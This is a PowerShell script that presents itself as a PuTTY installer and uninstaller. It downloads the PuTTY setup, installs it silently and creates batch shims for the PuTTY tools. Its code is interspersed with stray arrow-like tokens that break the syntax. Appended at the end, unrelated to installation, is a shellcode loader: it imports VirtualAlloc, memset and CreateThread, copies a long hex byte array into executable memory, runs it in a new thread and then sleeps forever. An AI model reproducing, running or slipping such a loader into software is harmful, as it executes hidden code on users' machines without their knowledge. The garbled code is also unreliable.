param(
	[string]$Version,
	[string]$Path,
	[switch]$Force,
	$Update,
	[switch]$Uninstall
)





 -||-> $Configs = @{
	Url =  -||-> "http://the.earth.li/~sgtatham/putty/latest/x86/putty-0.63-installer.exe" <-||- 
    Path =  -||-> "$( -||-> Split-Path -Path $MyInvocation.MyCommand.Definition -Parent <-||- )\" <-||- 
} <-||- 

 -||-> $Configs | ForEach-Object{

     -||-> try{

         -||-> $_.Result = $null <-||- 
         -||-> if( -||-> -not $_.Path <-||- ){ -||-> $_.Path = $Path <-||- } <-||- 
         -||-> $Config = $_ <-||- 

        
        
        

         -||-> if( -||-> -not $Uninstall <-||- ){

            
            
            

             -||-> if( -||-> $_.ConditionExclusion <-||- ){            
                 -||-> $_.ConditionExclusionResult = $( -||-> Invoke-Expression $Config.ConditionExclusion -ErrorAction SilentlyContinue <-||- ) <-||-         
            } <-||-     
             -||-> if( -||-> ( -||-> $_.ConditionExclusionResult -eq $null <-||- ) -or $Force <-||- ){
                    	
                
                
                

                 -||-> $_.Downloads =  -||-> $_.Url | ForEach-Object{
                     -||-> Get-File -Url $_ -Path $Config.Path <-||- 
                } <-||-  <-||-        			

                
                
                

                 -||-> $_.Downloads | ForEach-Object{
                     -||-> Start-Process -FilePath $( -||-> Join-Path $_.Path $_.Filename <-||- ) -ArgumentList "/verysilent" -Wait <-||- 
                } <-||- 
                		
                
                
                

                 -||-> $Executable = "C:\Program Files (x86)\PuTTY\pageant.exe" <-||- ; -||-> if( -||-> Test-Path $Executable <-||- ){ -||-> Set-Content -Path ( -||-> Join-Path $PSbin.Path "pageant.bat" <-||- ) -Value "@echo off`nstart `"`" `"$Executable`" %*" <-||- } <-||- 
                 -||-> $Executable = "C:\Program Files (x86)\PuTTY\plink.exe" <-||- ; -||-> if( -||-> Test-Path $Executable <-||- ){ -||-> Set-Content -Path ( -||-> Join-Path $PSbin.Path "plink.bat" <-||- ) -Value "@echo off`nstart `"`" `"$Executable`" %*" <-||- } <-||- 
				 -||-> $Executable = "C:\Program Files (x86)\PuTTY\pscp.exe" <-||- ; -||-> if( -||-> Test-Path $Executable <-||- ){ -||-> Set-Content -Path ( -||-> Join-Path $PSbin.Path "pscp.bat" <-||- ) -Value "@echo off`nstart `"`" `"$Executable`" %*" <-||- } <-||- 
				 -||-> $Executable = "C:\Program Files (x86)\PuTTY\psftp.exe" <-||- ; -||-> if( -||-> Test-Path $Executable <-||- ){ -||-> Set-Content -Path ( -||-> Join-Path $PSbin.Path "psftp.bat" <-||- ) -Value "@echo off`nstart `"`" `"$Executable`" %*" <-||- } <-||- 
				 -||-> $Executable = "C:\Program Files (x86)\PuTTY\putty.exe" <-||- ; -||-> if( -||-> Test-Path $Executable <-||- ){ -||-> Set-Content -Path ( -||-> Join-Path $PSbin.Path "putty.bat" <-||- ) -Value "@echo off`nstart `"`" `"$Executable`" %*" <-||- } <-||- 
				 -||-> $Executable = "C:\Program Files (x86)\PuTTY\puttygen.exe" <-||- ; -||-> if( -||-> Test-Path $Executable <-||- ){ -||-> Set-Content -Path ( -||-> Join-Path $PSbin.Path "puttygen.bat" <-||- ) -Value "@echo off`nstart `"`" `"$Executable`" %*" <-||- } <-||- 
                
                
                
                

                 -||-> $_.Downloads | ForEach-Object{
                     -||-> Remove-Item $( -||-> Join-Path $_.Path $_.Filename <-||- ) <-||- 
                } <-||- 
                		
                
                
                
                		
                 -||-> if( -||-> $Update <-||- ){ -||-> $_.Result = "AppUpdated" <-||- ; -||-> $_ <-||- 
                }else{ -||-> $_.Result = "AppInstalled" <-||- ; -||-> $_ <-||- } <-||- 
            		
            
            
            
            		
            }else{
            	
                 -||-> $_.Result = "ConditionExclusion" <-||- ; -||-> $_ <-||- 
            } <-||- 

        
        
        
        	
        }else{

             -||-> if( -||-> Test-Path ( -||-> Join-Path $PSbin.Path "pageant.bat" <-||- ) <-||- ){ -||-> Remove-Item ( -||-> Join-Path $PSbin.Path "pageant.bat" <-||- ) <-||- } <-||- 
			 -||-> if( -||-> Test-Path ( -||-> Join-Path $PSbin.Path "plink.bat" <-||- ) <-||- ){ -||-> Remove-Item ( -||-> Join-Path $PSbin.Path "plink.bat" <-||- ) <-||- } <-||- 
			 -||-> if( -||-> Test-Path ( -||-> Join-Path $PSbin.Path "pscp.bat" <-||- ) <-||- ){ -||-> Remove-Item ( -||-> Join-Path $PSbin.Path "pscp.bat" <-||- ) <-||- } <-||- 
			 -||-> if( -||-> Test-Path ( -||-> Join-Path $PSbin.Path "psftp.bat" <-||- ) <-||- ){ -||-> Remove-Item ( -||-> Join-Path $PSbin.Path "psftp.bat" <-||- ) <-||- } <-||- 
			 -||-> if( -||-> Test-Path ( -||-> Join-Path $PSbin.Path "putty.bat" <-||- ) <-||- ){ -||-> Remove-Item ( -||-> Join-Path $PSbin.Path "putty.bat" <-||- ) <-||- } <-||- 
			 -||-> if( -||-> Test-Path ( -||-> Join-Path $PSbin.Path "puttygen.bat" <-||- ) <-||- ){ -||-> Remove-Item ( -||-> Join-Path $PSbin.Path "puttygen.bat" <-||- ) <-||- } <-||- 
			
             -||-> $Executable = "C:\Program Files (x86)\PuTTY\unins000.exe" <-||- ;  -||-> if( -||-> Test-Path $Executable <-||- ){ -||-> Start-Process -FilePath $Executable -ArgumentList "/verysilent" -Wait <-||- } <-||- 
            
             -||-> $_.Result = "AppUninstalled" <-||- ; -||-> $_ <-||- 
        } <-||- 

    
    
    

    }catch{

         -||-> $Config.Result = "Error" <-||- ; -||-> $Config <-||- 
    } <-||- 
} <-||- 
 -||-> $CCAN = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $CCAN -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xdd,0xd9,0x74,0x24,0xf4,0xb8,0x8a,0x7b,0xeb,0xc0,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x8e,0x99,0x1e,0x3c,0x66,0xdf,0xe1,0xbd,0x76,0x80,0x68,0x58,0x47,0x80,0x0f,0x28,0xf7,0x30,0x5b,0x7c,0xfb,0xbb,0x09,0x95,0x88,0xce,0x85,0x9a,0x39,0x64,0xf0,0x95,0xba,0xd5,0xc0,0xb4,0x38,0x24,0x15,0x17,0x01,0xe7,0x68,0x56,0x46,0x1a,0x80,0x0a,0x1f,0x50,0x37,0xbb,0x14,0x2c,0x84,0x30,0x66,0xa0,0x8c,0xa5,0x3e,0xc3,0xbd,0x7b,0x35,0x9a,0x1d,0x7d,0x9a,0x96,0x17,0x65,0xff,0x93,0xee,0x1e,0xcb,0x68,0xf1,0xf6,0x02,0x90,0x5e,0x37,0xab,0x63,0x9e,0x7f,0x0b,0x9c,0xd5,0x89,0x68,0x21,0xee,0x4d,0x13,0xfd,0x7b,0x56,0xb3,0x76,0xdb,0xb2,0x42,0x5a,0xba,0x31,0x48,0x17,0xc8,0x1e,0x4c,0xa6,0x1d,0x15,0x68,0x23,0xa0,0xfa,0xf9,0x77,0x87,0xde,0xa2,0x2c,0xa6,0x47,0x0e,0x82,0xd7,0x98,0xf1,0x7b,0x72,0xd2,0x1f,0x6f,0x0f,0xb9,0x77,0x5c,0x22,0x42,0x87,0xca,0x35,0x31,0xb5,0x55,0xee,0xdd,0xf5,0x1e,0x28,0x19,0xfa,0x34,0x8c,0xb5,0x05,0xb7,0xed,0x9c,0xc1,0xe3,0xbd,0xb6,0xe0,0x8b,0x55,0x47,0x0d,0x5e,0xc3,0x42,0x99,0xa1,0xbc,0x4d,0x3e,0x4a,0xbf,0x4d,0xdf,0x1a,0x36,0xab,0x8f,0x4a,0x19,0x64,0x6f,0x3b,0xd9,0xd4,0x07,0x51,0xd6,0x0b,0x37,0x5a,0x3c,0x24,0xdd,0xb5,0xe9,0x1c,0x49,0x2f,0xb0,0xd7,0xe8,0xb0,0x6e,0x92,0x2a,0x3a,0x9d,0x62,0xe4,0xcb,0xe8,0x70,0x90,0x3b,0xa7,0x2b,0x36,0x43,0x1d,0x41,0xb6,0xd1,0x9a,0xc0,0xe1,0x4d,0xa1,0x35,0xc5,0xd1,0x5a,0x10,0x5e,0xdb,0xce,0xdb,0x08,0x24,0x1f,0xdc,0xc8,0x72,0x75,0xdc,0xa0,0x22,0x2d,0x8f,0xd5,0x2c,0xf8,0xa3,0x46,0xb9,0x03,0x92,0x3b,0x6a,0x6c,0x18,0x62,0x5c,0x33,0xe3,0x41,0x5c,0x0f,0x32,0xaf,0x2a,0x61,0x86 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $ByK=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $ByK.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$ByK,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



